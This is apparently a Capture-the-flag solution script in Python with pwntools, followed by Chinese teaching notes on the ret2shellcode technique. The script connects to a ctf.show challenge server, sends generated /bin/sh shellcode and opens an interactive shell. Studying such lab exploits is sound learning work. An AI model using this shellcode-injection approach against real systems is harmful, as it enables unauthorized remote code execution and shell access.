from pwn import *

p = remote('pwn.challenge.ctf.show', 28255)

shellcode = asm(shellcraft.sh())

p.sendlineafter('Attach it!\n', shellcode)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2shellcode - 最基础版本
2. 核心条件：
   - 程序没有开启NX保护（栈可执行）
   - 存在栈溢出漏洞
   - 可以将shellcode写入栈并执行
3. shellcraft.sh()：
   - pwntools内置的shellcode生成函数
   - 生成执行/bin/sh的汇编代码
   - 默认根据context设置生成对应架构的代码
4. asm()函数：
   - 将汇编代码编译成机器码
   - 返回bytes类型的shellcode
5. 利用流程：
   - 生成shellcode
   - 发送shellcode到栈上
   - 溢出返回地址指向shellcode
6. 本题特点：
   - 非常简单，直接发送shellcode即可
   - 可能程序直接将输入作为代码执行
7. 关键点：理解shellcode概念和基本使用
"""
